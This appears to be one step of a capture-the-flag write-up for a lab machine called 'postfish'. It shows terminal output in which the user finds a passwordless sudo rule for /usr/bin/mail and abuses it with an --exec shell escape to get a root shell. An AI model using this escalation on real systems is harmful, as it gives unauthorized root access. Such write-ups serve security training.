# 9 privesc > root

```
filter@postfish:/var/spool/postfix$ sudo -l
Matching Defaults entries for filter on postfish:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User filter may run the following commands on postfish:
    (ALL) NOPASSWD: /usr/bin/mail *

filter@postfish:/var/spool/postfix$ sudo mail --exec='!/bin/sh'
sudo mail --exec='!/bin/sh'
whoami;id;hostname;uname -a
root
uid=0(root) gid=0(root) groups=0(root)
postfish
Linux postfish 5.4.0-64-generic #72-Ubuntu SMP Fri Jan 15 10:27:54 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```
